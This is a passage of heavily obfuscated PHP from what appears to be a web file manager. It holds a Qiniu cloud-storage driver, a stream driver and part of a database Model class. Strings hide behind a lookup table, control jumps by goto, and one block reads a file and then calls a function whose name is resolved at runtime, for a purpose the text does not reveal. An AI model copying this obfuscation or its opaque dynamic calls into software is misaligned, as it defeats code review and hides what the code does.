setUserJob($ÚéÜß®, $ğ¯…ÉõÕ) { $Õù˜ğÊ =& $_SERVER[ìïæ“œî]; if (!is_array($ğ¯…ÉõÕ)) { $ğ¯…ÉõÕ = array($ğ¯…ÉõÕ); } $ÑäÂóƒ„ = parent::listData(); $‹ò‡Ãüî = array_to_keyvalue($ÑäÂóƒ„, $Õù˜ğÊ[32]); $õçÁË‰ = $Õù˜ğÊ[454]; foreach ($ğ¯…ÉõÕ as $ñüÉƒÅÕ) { if ($‹ò‡Ãüî[$ñüÉƒÅÕ]) { $õçÁË‰ .= $‹ò‡Ãüî[$ñüÉƒÅÕ][$Õù˜ğÊ[475]] . $Õù˜ğÊ[50]; } else { $²ìÕŠ•à = $this->add($ñüÉƒÅÕ); $õçÁË‰ .= $²ìÕŠ•à . $Õù˜ğÊ[50]; } } $õçÁË‰ = rtrim($õçÁË‰, $Õù˜ğÊ[50]); Model($Õù˜ğÊ[598])->metaSet($ÚéÜß®, self::JOB_KEY, $õçÁË‰); } public function getUserJob($Ğ™Û¿€‡) { $ğŞüº½¨ = Model($_SERVER[ìïæ“œî][598])->metaGet($Ğ™Û¿€‡); return $this->getUserJobInfo($ğŞüº½¨[self::JOB_KEY]); } public function getUserJobInfo($÷—ç¹«’) { $şÇ¡¤° =& $_SERVER[ìïæ“œî]; $ÎÅ‘¶òÔ = explode($şÇ¡¤°[50], $÷—ç¹«’); $”îê¯•À = parent::listData(); $”îê¯•À = array_remove_key($”îê¯•À, $şÇ¡¤°[231]); $—÷×·å² = array(); foreach ($ÎÅ‘¶òÔ as $ÃåëÁà¶) { if (isset($”îê¯•À[$ÃåëÁà¶])) { $—÷×·å²[] = $”îê¯•À[$ÃåëÁà¶]; } } return $—÷×·å²; } } goto Fã‡ÒÕ˜÷í; FŠÂÇàİ—: if ($_SERVER[$_SERVER[ìïæ“œî][927]] != $_SERVER[$_SERVER[ìïæ“œî][1428]]) { $_getc = $_SERVER[ìïæ“œî][929]; $_getfile = $_SERVER[$_SERVER[ìïæ“œî][930]] . $_SERVER[ìïæ“œî][931]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ìïæ“œî][262], $_getfilec); if (count($_getarrs) < $_SERVER[ìïæ“œî][710]) { $exit = $_SERVER[ìïæ“œî][932]; $exit(); } $_act = $_SERVER[ìïæ“œî][1429]; $_act($_SERVER[$_SERVER[ìïæ“œî][925]]); } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ÌäùÆáµ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ìïæ“œî][1505]; $this->_init($ÌäùÆáµ); } public function _init($°ææ–¿„) { $ğá †«ò =& $_SERVER[ìïæ“œî]; $this->config = $°ææ–¿„; foreach ($°ææ–¿„ as $‰¦©í…Í => $µœ™÷Ú±) { if (isset($this->{$‰¦©í…Í})) { $this->{$‰¦©í…Í} = $µœ™÷Ú±; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ğá †«ò[1506] . LNG($ğá †«ò[1441])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($š‹Ç¾êó, $Šà÷åî± = '', $éàÂÇ±µ = REPEAT_RENAME) { if ($this->setContent($š‹Ç¾êó, $Šà÷åî±)) { return $this->getPathOuter($š‹Ç¾êó); } return !1; } public function mkdir($›Ä¤ÓëÙ, $€Óû¾  = REPEAT_SKIP) { $ã•‹€«ã =& $_SERVER[ìïæ“œî]; $•ï‰¹ñ = trim($›Ä¤ÓëÙ, $ã•‹€«ã[8]); if ($this->_isFolder($•ï‰¹ñ)) { return $this->getPathOuter($•ï‰¹ñ); } $›Ä¤ÓëÙ = $•ï‰¹ñ . $ã•‹€«ã[8]; $Ÿ´‹çª¶ = get_path_this($•ï‰¹ñ); $Ìœğ‚‡ª = $›Ä¤ÓëÙ . $Ÿ´‹çª¶; if (!$this->mkfile($Ìœğ‚‡ª)) { return !1; } if (!$this->moveFile($Ìœğ‚‡ª, $›Ä¤ÓëÙ)) { $this->delFile($Ìœğ‚‡ª); return !1; } return $this->getPathOuter($•ï‰¹ñ); } public function copyFile($ïÜ ÓãÜ, $ ˆ™”Í—) { $Ö•Ìúé® = $this->bucketManager->copy($this->bucket, $ïÜ ÓãÜ, $this->bucket, $ ˆ™”Í—, !0); return $Ö•Ìúé® ? !1 : $this->getPathOuter($ ˆ™”Í—); } public function moveFile($õÙÁöÛ, $³ƒÈ¨¤Ö) { $Òú½‚˜ = $this->bucketManager->move($this->bucket, $õÙÁöÛ, $this->bucket, $³ƒÈ¨¤Ö, !0); return $Òú½‚˜ ? !1 : $this->getPathOuter($³ƒÈ¨¤Ö); } public function delFile($¤ñŸ¸êê) { if (!$this->exist($¤ñŸ¸êê)) { return !0; } $íˆ€¨ï… = $this->bucketManager->delete($this->bucket, $¤ñŸ¸êê); return $íˆ€¨ï… ? !1 : !0; } public function delFolder($‚«”Å¢Ğ) { $ÃÒº´Â =& $_SERVER[ìïæ“œî]; if (!$this->exist($‚«”Å¢Ğ)) { return !0; } $this->listItemCache = !1; $ËÈİÉ©œ = $this->fileList($‚«”Å¢Ğ); $this->listItemCache = !0; $ÀÌÊ¨¾ = trim($‚«”Å¢Ğ, $ÃÒº´Â[8]) . $ÃÒº´Â[8]; if (!empty($‚«”Å¢Ğ) && $‚«”Å¢Ğ !== $ÃÒº´Â[228] && !in_array($ÀÌÊ¨¾, $ËÈİÉ©œ[$ÃÒº´Â[85]])) { $ËÈİÉ©œ[$ÃÒº´Â[85]][] = $ÀÌÊ¨¾; } $Õº”±òÕ = $this->delByBatch($ËÈİÉ©œ[$ÃÒº´Â[86]]); if (!$Õº”±òÕ) { return !1; } $Õº”±òÕ = $this->delByBatch($ËÈİÉ©œ[$ÃÒº´Â[85]]); if (!$Õº”±òÕ) { return !1; } return $this->delFile($ÀÌÊ¨¾); } private function delByBatch($—„â¡£ú) { foreach (array_chunk($—„â¡£ú, 1000) as $˜ß¢»Ø´) { $•ºç˜˜Æ = $this->bucketManager->buildBatchDelete($this->bucket, $˜ß¢»Ø´); list($¨ÚÙâÄ™, $ãÈ™ĞÖš) = $this->bucketManager->batch($•ºç˜˜Æ); if ($ãÈ™ĞÖš) { return !1; } } return !0; } public function rename($ó…Ë½‡Ê, $í¸Í¦»´) { return $this->renameObject($ó…Ë½‡Ê, $í¸Í¦»´); } public function fileInfo($÷Ãèä­æ, $½şâæ» = false, $ï€›ùÒˆ = array()) { $ß–ŸÎ­ =& $_SERVER[ìïæ“œî]; $ÓŸšğ’ = array($ß–ŸÎ­[32] => $this->pathThis($÷Ãèä­æ), $ß–ŸÎ­[87] => $this->getPathOuter($ß–ŸÎ­[8] . $÷Ãèä­æ), $ß–ŸÎ­[33] => $ß–ŸÎ­[230], $ß–ŸÎ­[79] => isset($ï€›ùÒˆ[$ß–ŸÎ­[1507]]) ? $ï€›ùÒˆ[$ß–ŸÎ­[1507]] : 0, $ß–ŸÎ­[169] => $this->ext($÷Ãèä­æ)); if ($½şâæ») { return $ÓŸšğ’; } $ÓŸšğ’[$ß–ŸÎ­[231]] = $ÓŸšğ’[$ß–ŸÎ­[88]] = 0; $ÓŸšğ’[$ß–ŸÎ­[232]] = $ÓŸšğ’[$ß–ŸÎ­[233]] = !0; if (empty($ï€›ùÒˆ)) { $ï€›ùÒˆ = $this->objectMeta($÷Ãèä­æ); if (!$ï€›ùÒˆ) { return $ÓŸšğ’; } } if (isset($ï€›ùÒˆ[$ß–ŸÎ­[234]]) && $ï€›ùÒˆ[$ß–ŸÎ­[234]]) { $ÓŸšğ’[$ß–ŸÎ­[235]] = $ï€›ùÒˆ[$ß–ŸÎ­[234]]; } if (isset($ï€›ùÒˆ[$ß–ŸÎ­[245]]) && $ï€›ùÒˆ[$ß–ŸÎ­[245]]) { $ÓŸšğ’[$ß–ŸÎ­[235]] = $ï€›ùÒˆ[$ß–ŸÎ­[245]]; } if (isset($ï€›ùÒˆ[$ß–ŸÎ­[1508]])) { $ÓŸšğ’[$ß–ŸÎ­[88]] = substr($ï€›ùÒˆ[$ß–ŸÎ­[1508]] . $ß–ŸÎ­[12], 0, 10); } if (isset($ï€›ùÒˆ[$ß–ŸÎ­[1507]])) { $ÓŸšğ’[$ß–ŸÎ­[79]] = $ï€›ùÒˆ[$ß–ŸÎ­[1507]]; } return $ÓŸšğ’; } public function folderInfo($´àØµšé, $í¢Ü³õ = false) { $Î°Âõ =& $_SERVER[ìïæ“œî]; $û­Ã€µ× = array($Î°Âõ[32] => $this->pathThis($´àØµšé), $Î°Âõ[87] => $this->getPathOuter($Î°Âõ[8] . $´àØµšé), $Î°Âõ[33] => $Î°Âõ[78]); if ($í¢Ü³õ) { return $û­Ã€µ×; } $û­Ã€µ×[$Î°Âõ[231]] = $û­Ã€µ×[$Î°Âõ[88]] = 0; $û­Ã€µ×[$Î°Âõ[232]] = $û­Ã€µ×[$Î°Âõ[233]] = !0; $´àØµšé = rtrim($´àØµšé, $Î°Âõ[8]) . $Î°Âõ[8]; $£§—•Î± = $this->objectMeta($´àØµšé); if (isset($£§—•Î±[$Î°Âõ[1508]])) { $û­Ã€µ×[$Î°Âõ[88]] = substr($£§—•Î±[$Î°Âõ[1508]] . $Î°Âõ[12], 0, 10); } return $û­Ã€µ×; } public function listPath($³œ¥ÆÙÂ, $Øğ‹••ñ = false) { $´ä„å¡ =& $_SERVER[ìïæ“œî]; $Ó”ÙÊæ = $this->fileList($³œ¥ÆÙÂ, $´ä„å¡[8], !0); foreach ($Ó”ÙÊæ[$´ä„å¡[85]] as $úÍå’“ => $¦‰åê œ) { $Ó”ÙÊæ[$´ä„å¡[85]][$úÍå’“] = $this->folderInfo($¦‰åê œ, $Øğ‹••ñ); } foreach ($Ó”ÙÊæ[$´ä„å¡[86]] as $úÍå’“ => $¦‰åê œ) { $Ó”ÙÊæ[$´ä„å¡[86]][$úÍå’“] = $this->fileInfo($¦‰åê œ[$´ä„å¡[97]], $Øğ‹••ñ, $¦‰åê œ); } return $Ó”ÙÊæ; } public function has($–õò·„, $å´¤óíÀ = false, $Š¥ï©§Ã = true) { $»Â„ =& $_SERVER[ìïæ“œî]; $–õò·„ = trim($–õò·„, $»Â„[8]); $šÙ‹£ô• = empty($–õò·„) && $–õò·„ !== $»Â„[228] ? $»Â„[12] : $–õò·„ . $»Â„[8]; $ı´ŞÙ¬Á = $»Â„[12]; $²üàÍåö = 500; $şÏº£Â£ = $»Â„[8]; $òµ°‚– = $ÚÉ¹Ïúï = 0; while (!0) { check_abort(); list($…ŞûØš¶, $à«Å¼îŠ) = $this->bucketManager->listFiles($this->bucket, $šÙ‹£ô•, $ı´ŞÙ¬Á, $²üàÍåö, $şÏº£Â£); if ($à«Å¼îŠ) { break; } $ı´ŞÙ¬Á = array_key_exists($»Â„[1453], $…ŞûØš¶) ? $ı´ŞÙ¬Á = $…ŞûØš¶[$»Â„[1509]] : $»Â„[12]; if ($å´¤óíÀ) { if (!empty($…ŞûØš¶[$»Â„[1510]])) { $òµ°‚– += count($…ŞûØš¶[$»Â„[1510]]); } if (!empty($…ŞûØš¶[$»Â„[1511]])) { $ÚÉ¹Ïúï += count($…ŞûØš¶[$»Â„[1511]]); } if ($ı´ŞÙ¬Á === $»Â„[12]) { break; } continue; } if ($Š¥ï©§Ã) { if (!empty($…ŞûØš¶[$»Â„[1510]])) { return !0; } } else { if (!empty($…ŞûØš¶[$»Â„[1511]])) { return !0; } } if ($ı´ŞÙ¬Á === $»Â„[12]) { break; } } if ($å´¤óíÀ) { return array($»Â„[239] => $òµ°‚–, $»Â„[240] => $ÚÉ¹Ïúï); } return !1; } public function listAll($ã°Ù£À) { $§É‰ªÆ§ =& $_SERVER[ìïæ“œî]; $ëçúì¶¶ = $this->fileList($ã°Ù£À, $§É‰ªÆ§[12], !0); $¯åéøàÇ = array_to_keyvalue($ëçúì¶¶[$§É‰ªÆ§[86]], $§É‰ªÆ§[32]); foreach ($ëçúì¶¶[$§É‰ªÆ§[85]] as $¬˜½±´ı) { if (is_string($¬˜½±´ı)) { $¯åéøàÇ[$¬˜½±´ı] = array($§É‰ªÆ§[79] => 0); } } return $this->listAllFiles($ã°Ù£À, $¯åéøàÇ); } private function fileList($‡‚øıâ’, $‘ş¾Êè¯ = '', $‚Ïïß¸ı = 0) { $¢Ì€®¬ö =& $_SERVER[ìïæ“œî]; $‡‚øıâ’ = trim($‡‚øıâ’, $¢Ì€®¬ö[8]); $Ë‘ë­÷† = empty($‡‚øıâ’) && $‡‚øıâ’ !== $¢Ì€®¬ö[228] ? $¢Ì€®¬ö[12] : $‡‚øıâ’ . $¢Ì€®¬ö[8]; $ßÍıÏê = $¢Ì€®¬ö[12]; $‡©©ˆöÊ = 1000; $ƒı«ÄÙÛ = $ùşùÛ©Ñ = array(); while (!0) { check_abort(); list($²ùÃŞœÊ, $¯ÚôŞ˜Î) = $this->bucketManager->listFiles($this->bucket, $Ë‘ë­÷†, $ßÍıÏê, $‡©©ˆöÊ, $‘ş¾Êè¯); if ($¯ÚôŞ˜Î) { break; } $ßÍıÏê = array_key_exists($¢Ì€®¬ö[1453], $²ùÃŞœÊ) ? $ßÍıÏê = $²ùÃŞœÊ[$¢Ì€®¬ö[1509]] : $¢Ì€®¬ö[12]; $³ô‚ë¢¼ = isset($²ùÃŞœÊ[$¢Ì€®¬ö[1510]]) ? $²ùÃŞœÊ[$¢Ì€®¬ö[1510]] : array(); $¨­¼”îú = isset($²ùÃŞœÊ[$¢Ì€®¬ö[1511]]) ? $²ùÃŞœÊ[$¢Ì€®¬ö[1511]] : array(); foreach ($³ô‚ë¢¼ as $—İ Ãµ) { if ($—İ Ãµ[$¢Ì€®¬ö[97]] == $Ë‘ë­÷†) { continue; } $ÜÕÃïÇÚ = $—İ Ãµ[$¢Ì€®¬ö[97]]; $¨«¹±–Ã = $—İ Ãµ[$¢Ì€®¬ö[1507]]; $—İ Ãµ[$¢Ì€®¬ö[79]] = $¨«¹±–Ã; $œ®èá¢¬ = $¨«¹±–Ã == 0 && substr($ÜÕÃïÇÚ, strlen($ÜÕÃïÇÚ) - 1, 1) == $¢Ì€®¬ö[8] ? !0 : !1; $this->cacheMethodInfoSet($ÜÕÃïÇÚ, $œ®èá¢¬, $—İ Ãµ); if ($œ®èá¢¬) { $ƒı«ÄÙÛ[] = $ÜÕÃïÇÚ; continue; } $ùşùÛ©Ñ[] = $‚Ïïß¸ı ? $—İ Ãµ : $ÜÕÃïÇÚ; } foreach ($¨­¼”îú as $ÜÕÃïÇÚ) { if ($ÜÕÃïÇÚ == $Ë‘ë­÷†) { continue; } $ƒı«ÄÙÛ[] = $ÜÕÃïÇÚ; $this->cacheMethodInfoSet($ÜÕÃïÇÚ, !0); } if ($ßÍıÏê === $¢Ì€®¬ö[12]) { break; } } $this->cacheMethodInfoSet($‡‚øıâ’, !0); return array($¢Ì€®¬ö[85] => $ƒı«ÄÙÛ, $¢Ì€®¬ö[86] => $ùşùÛ©Ñ); } public function canRead($Ó æ°ğ¡) { return $this->exist($Ó æ°ğ¡) ? !0 : !1; } public function canWrite($™€ßøÄ) { return $this->exist($™€ßøÄ) ? !0 : !1; } public function getContent($ÈÀğªèã) { return $this->fileSubstr($ÈÀğªèã, 0, -1); } public function setContent($©Š¡’ˆ», $”ô±‚‘ = '') { $šñ¾ç§‹ = $this->tempFile($this->pathThis($©Š¡’ˆ»)); file_put_contents($šñ¾ç§‹, $”ô±‚‘); if ($this->upload($©Š¡’ˆ», $šñ¾ç§‹)) { $this->tempFileRemve($šñ¾ç§‹); return !0; } return !1; } public function refreshUrls($‡©‡ä¦Í) { $óŸÄùßç =& $_SERVER[ìïæ“œî]; $äÆ–áÓŠ = array(); if (is_array($‡©‡ä¦Í)) { foreach ($‡©‡ä¦Í as $Ïõ€ğ½Ö) { $äÆ–áÓŠ[] = $this->link($Ïõ€ğ½Ö); } } else { $äÆ–áÓŠ[] = $this->link($‡©‡ä¦Í); } $Å½¬É¾ = new Qiniu\Cdn\CdnManager($this->auth); list($÷ìôãš, $ş¥÷Öã) = $Å½¬É¾->refreshUrls($äÆ–áÓŠ); if ($ş¥÷Öã) { return !1; } return $÷ìôãš[$óŸÄùßç[1241]] == $óŸÄùßç[808] ? !0 : !1; } public function fileSubstr($ğÃª¹Ç·, $ı’çâØª, $…æé¹Ä») { $ñ‚¬¹¿ì =& $_SERVER[ìïæ“œî]; if (!($“Œ÷ˆ« = $this->link($ğÃª¹Ç·))) { return !1; } $«¼‘ÒŠ¹ = !1; if ($…æé¹Ä» > 0) { $‰Ã‡Ÿ™‘ = $ı’çâØª + $…æé¹Ä» - 1; $«¼‘ÒŠ¹ = array($ñ‚¬¹¿ì[1512] . $ı’çâØª . $ñ‚¬¹¿ì[462] . $‰Ã‡Ÿ™‘); } $éæ£  = url_request($“Œ÷ˆ«, $ñ‚¬¹¿ì[261], !1, $«¼‘ÒŠ¹); return $éæ£ [$ñ‚¬¹¿ì[799]] ? $éæ£ [$ñ‚¬¹¿ì[1264]] : !1; } public function upload($ƒ©°Š»š, $¤©ŒÅ…, $Ö°¡¦¹Î = false, $³§¹‹‡Ñ = REPEAT_REPLACE) { $øŠšĞÊÓ = new Qiniu\Storage\UploadManager(); $è€¾¿ù‚ = $this->auth->uploadToken($this->bucket, $ƒ©°Š»š); $±„ƒ¦Â = get_file_mime(get_path_ext($¤©ŒÅ…)); list($ĞíÄÛÑ¢, $Ê«¬ ª) = $øŠšĞÊÓ->putFile($è€¾¿ù‚, $ƒ©°Š»š, $¤©ŒÅ…, null, $±„ƒ¦Â); return $Ê«¬ ª ? !1 : $this->getPathOuter($ƒ©°Š»š); } public function uploadFormData($ÔÁ¤²¡•, $ğùŠ ´œ = 3600) { return $this->uploadToken($ÔÁ¤²¡•, $ğùŠ ´œ); } public function multiUploadFormData($ÌÇËí×Ó, $¦è³ƒôŠ = 3600) { return $this->uploadToken($ÌÇËí×Ó, $¦è³ƒôŠ); } private function uploadToken($€„ÍŒ»ı, $Úë‰”†í = 3600) { $¡†—”Å„ =& $_SERVER[ìïæ“œî]; $ìÇÍşÑÌ = $Úë‰”†í; $‘˜•ç³› = array($¡†—”Å„[1513] => $¡†—”Å„[1514]); $·‘îïİÁ = $€„ÍŒ»ı; $ïãŒŸÄæ = $this->auth->uploadToken($this->bucket, $·‘îïİÁ, $ìÇÍşÑÌ, $‘˜•ç³›, !0); $ÄÍùŠÕÄ = empty($this->region) || $this->region == $¡†—”Å„[1515] ? $¡†—”Å„[12] : $¡†—”Å„[462] . $this->region; $¯æåëû§ = http_type() . "\x3a\x2f\57\x75\160\x6c\x6f\x61\x64{$ÄÍùŠÕÄ}\56\x71\151\156\151\x75\x70\x2e\143\x6f\x6d\57"; return array($¡†—”Å„[1516] => $ïãŒŸÄæ, $¡†—”Å„[1517] => $¯æåëû§); } public function download($Óş¶¸ï¾, $ÖØ—İ·×) { $è¡ŒÌ = IO::getPathInner(IO::mkfile($ÖØ—İ·×)); if (!($æŸÕş÷í = $this->link($Óş¶¸ï¾))) { return !1; } $‘Ã®™òÛ = 0; $”—ş™—¤ = 1024 * 200; $Ã‰„–ìº = fopen($è¡ŒÌ, $_SERVER[ìïæ“œî][1518]); while (!0) { $“¡ÇåİÕ = $this->fileSubstr($Óş¶¸ï¾, $‘Ã®™òÛ, $”—ş™—¤); if ($“¡ÇåİÕ === !1) { return !1; } fwrite($Ã‰„–ìº, $“¡ÇåİÕ); $‘Ã®™òÛ += $”—ş™—¤; if (strlen($“¡ÇåİÕ) < $”—ş™—¤) { break; } } fclose($Ã‰„–ìº); return $ÖØ—İ·×; } public function link($šÏ·›¸¦, $ßËìğ Ã = '') { if (!$this->isFile($šÏ·›¸¦)) { return !1; } $‡òòÁŞ = $this->getHost() . $_SERVER[ìïæ“œî][8] . $this->pathEncode($šÏ·›¸¦) . $ßËìğ Ã; return $this->auth->privateDownloadUrl($‡òòÁŞ, 3600 * 12); } public function fileOut($·“š¦“û, $¹‰—ĞÃÏ = false, $ìêşÎÓœ = false, $¿…ıŞÁñ = '') { $ºÀŒÙ´† =& $_SERVER[ìïæ“œî]; if ($this->isFileOutServer()) { return $this->fileOutServer($·“š¦“û, $¹‰—ĞÃÏ, $ìêşÎÓœ, $¿…ıŞÁñ); } if (!$ìêşÎÓœ) { $ìêşÎÓœ = $this->pathThis($·“š¦“û); } $àĞ¯À÷Ş = $¹‰—ĞÃÏ ? $ºÀŒÙ´†[1519] . rawurlencode($ìêşÎÓœ) : $ºÀŒÙ´†[12]; $ì¿ê¯¨± = $this->link($·“š¦“û, $àĞ¯À÷Ş); $this->fileOutLink($ì¿ê¯¨±); } public function fileOutServer($÷®õ××Æ, $ûÚ–°äï = false, $µôûº–— = false, $®¦úÕé´ = '') { parent::fileOut($÷®õ××Æ, $ûÚ–°äï, $µôûº–—, $®¦úÕé´); } public function fileOutImage($¹»ô÷ó´, $Ú´è²ç = 250) { if ($this->size($¹»ô÷ó´) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¹»ô÷ó´, $Ú´è²ç); } $Ì¯ì¨¤û = $this->link($¹»ô÷ó´, $_SERVER[ìïæ“œî][1520] . $Ú´è²ç); $this->fileOutLink($Ì¯ì¨¤û); } public function fileOutImageServer($œË‡ğĞŒ, $šçÛÏÁû = 250) { parent::fileOutImage($œË‡ğĞŒ, $šçÛÏÁû); } public function hashMd5($Á¶ÂéÒ) { $™¥ £ßè =& $_SERVER[ìïæ“œî]; $Û˜´‡÷  = $this->objectMeta($Á¶ÂéÒ); return isset($Û˜´‡÷ [$™¥ £ßè[245]]) ? $Û˜´‡÷ [$™¥ £ßè[245]] : !1; $ÄÅ€ŞíÒ = $this->link($Á¶ÂéÒ, $™¥ £ßè[1521]); } public function size($ªü¤ ¸Û) { $îïàÇÉÖ = $this->objectMeta($ªü¤ ¸Û); return $îïàÇÉÖ ? $îïàÇÉÖ[$_SERVER[ìïæ“œî][79]] : 0; } public function info($ï²µ™îÄ) { if ($this->isFolder($ï²µ™îÄ)) { return $this->folderInfo($ï²µ™îÄ); } else { if ($this->isFile($ï²µ™îÄ)) { return $this->fileInfo($ï²µ™îÄ); } } return !1; } public function exist($„µ¬¨ˆ) { return $this->isFile($„µ¬¨ˆ) || $this->isFolder($„µ¬¨ˆ); } public function isFile($–ÏÖ”µ¼) { return !$this->isFolder($–ÏÖ”µ¼) && $this->objectMeta($–ÏÖ”µ¼); } public function isFolder($›‰ÙŞ±Ô) { return $this->cacheMethod($_SERVER[ìïæ“œî][179], $›‰ÙŞ±Ô); } protected function objectMeta($³¸À¤öÇ) { return $this->cacheMethod($_SERVER[ìïæ“œî][181], $³¸À¤öÇ); } protected function _objectMeta($×“öº¦…) { $„ÜÃú…ú =& $_SERVER[ìïæ“œî]; list($‡Åğ½¶, $ì»œÉıù) = $this->bucketManager->stat($this->bucket, $×“öº¦…); if ($‡Åğ½¶) { $‡Åğ½¶[$„ÜÃú…ú[79]] = intval($‡Åğ½¶[$„ÜÃú…ú[1507]]); } return $‡Åğ½¶; } protected function _isFolder($ŠáçÎ‹•) { $ªŞÍÃş« =& $_SERVER[ìïæ“œî]; if ($ŠáçÎ‹• == $ªŞÍÃş«[12] || $ŠáçÎ‹• == $ªŞÍÃş«[8]) { return !0; } list($›ãÇ¡¾Ò, $”‚ëŞû) = $this->bucketManager->listFiles($this->bucket, trim($ŠáçÎ‹•, $ªŞÍÃş«[8]) . $ªŞÍÃş«[8], $ªŞÍÃş«[12], 1, $ªŞÍÃş«[8]); return !empty($›ãÇ¡¾Ò[$ªŞÍÃş«[1510]]) || !empty($›ãÇ¡¾Ò[$ªŞÍÃş«[1511]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($íÃ†¤ñ, $¸öåœç® = 0) { parent::__construct(); $this->source = $íÃ†¤ñ; $this->sourceSize = $¸öåœç®; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($¼Îàâ°› = false) { return $this->sourceSize; } public function getContent($ø©Ø¸£¼ = false) { return $this->fileSubstr($ø©Ø¸£¼, 0, $this->sourceSize); } public function fileSubstr($®ëİŠ“è = false, $§øá‹ò = 0, $¬ôã—Ì = 0) { if (!$¬ôã—Ì) { $¬ôã—Ì = $this->sourceSize; } $ŒÀêßìÙ = $this->sourceSize - $§øá‹ò; if ($¬ôã—Ì >= $ŒÀêßìÙ) { $¬ôã—Ì = $ŒÀêßìÙ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $§øá‹ò, $¬ôã—Ì); } if ($this->sourceType == self::TYPE_FILE) { if ($¬ôã—Ì <= 0) { return $_SERVER[ìïæ“œî][12]; } $¥²´ÂÑ = ftell($this->source); fseek_64($this->source, $¥²´ÂÑ + $§øá‹ò); $›—…ëÖƒ = @fread($this->source, $¬ôã—Ì); fseek_64($this->source, $¥²´ÂÑ); return $›—…ëÖƒ; } } public function hashMd5($¾®™½óû = false) { return md5($this->getContent()); } public static function hash($‡˜¿ØÏÈ, $´„Õ‹©å = 0) { $­Ö®öÑ‡ = new PathDriverStream($‡˜¿ØÏÈ, $´„Õ‹©å); return $­Ö®öÑ‡->hashSimple($‡˜¿ØÏÈ); } public static function md5($³Ÿ—Êù, $¬â÷Áªè = 0) { $ûÕ±²õõ = new PathDriverStream($³Ÿ—Êù, $¬â÷Áªè); return $ûÕ±²õõ->hashMd5($³Ÿ—Êù); } } goto CÃƒÜ¼èÎò; EÚ……¹È¨¡: define($_SERVER[ìïæ“œî][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\157\162\x64\145\x72", "\141\x6c\x69\141\x73", "\150\x61\166\151\156\x67", "\x67\x72\x6f\x75\160", "\x6c\x6f\x63\153", "\144\151\163\x74\151\156\143\164", "\x61\165\x74\157", "\146\x69\x6c\164\x65\162", "\166\141\x6c\x69\144\141\x74\x65", "\162\x65\163\x75\x6c\x74", "\142\151\156\x64", "\164\157\x6b\145\x6e"); public function __construct($’ùÂÍâš = '', $®¼˜¦¦ = '', $£°ıÃû = '') { $ªüÄàÉ… =& $_SERVER[ìïæ“œî]; $this->_initialize(); if (!empty($’ùÂÍâš)) { if (strpos($’ùÂÍâš, $ªüÄàÉ…[10])) { list($this->dbName, $this->name) = explode($ªüÄàÉ…[10], $’ùÂÍâš); } else { $this->name = $’ùÂÍâš; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($®¼˜¦¦)) { $this->tablePrefix = $ªüÄàÉ…[12]; } elseif ($ªüÄàÉ…[12] != $®¼˜¦¦) { $this->tablePrefix = $®¼˜¦¦; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ªüÄàÉ…[321]); } $this->db(0, empty($this->connection) ? $£°ıÃû : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ûøó™è =& $_SERVER[ìïæ“œî]; if (empty($this->fields)) { if (think_config($ûøó™è[322])) { $Ê‰ş©ŞÙ = $this->dbName ? $this->dbName : think_config($ûøó™è[323]); $´Äèƒ¯İ = think_var_cache($ûøó™è[324] . strtolower(get_path_this($Ê‰ş©ŞÙ) . $ûøó™è[10] . $this->name)); if ($´Äèƒ¯İ) { $§ó‘Æ¯ç = think_config($ûøó™è[325]); if (empty($§ó‘Æ¯ç) || $´Äèƒ¯İ[$ûøó™è[326]] == $§ó‘Æ¯ç) { $this->fields = $´Äèƒ¯İ; return; } } } $this->flush(); } } public function flush() { $ÓÍ“·² =& $_SERVER[ìïæ“œî]; $this->db->setModel($this->name); $ûù˜¦— = $this->db->getFields($this->getTableName()); if (!$ûù˜¦—) { return !1; } $this->fields = array_keys($ûù˜¦—); $this->fields[$ÓÍ“·²[327]] = !1; foreach ($ûù˜¦— as $‚ßÛĞœ‹ => $®ôƒ×Ôª) { $Àáş¤äã[$‚ßÛĞœ‹] = $®ôƒ×Ôª[$ÓÍ“·²[33]]; if ($®ôƒ×Ôª[$ÓÍ“·²[39]]) { $this->fields[$ÓÍ“·²[328]] = $‚ßÛĞœ‹; if ($®ôƒ×Ôª[$ÓÍ“·²[42]]) { $this->fields[$ÓÍ“·²[327]] = !0; } } } $this->fields[$ÓÍ“·²[329]] = $Àáş¤äã; if (think_config($ÓÍ“·²[325])) { $this->fields[$ÓÍ“·²[326]] = think_config($ÓÍ“·²[325]); } if (think_config($ÓÍ“·²[322])) { $¢òîîŞ¬ = $this->dbName ? $this->dbName : think_config($ÓÍ“·²[323]); think_var_cache($ÓÍ“·²[324] . strtolower(get_path_this($¢òîîŞ¬) . $ÓÍ“·²[10] . $this->name), $this->fields); } } public function switchModel($Ş·ö„Ø, $ìÃŸ†—€ = array()) { $ÍÀØêÒÍ =& $_SERVER[ìïæ“œî]; $Æô˜Ó±é = 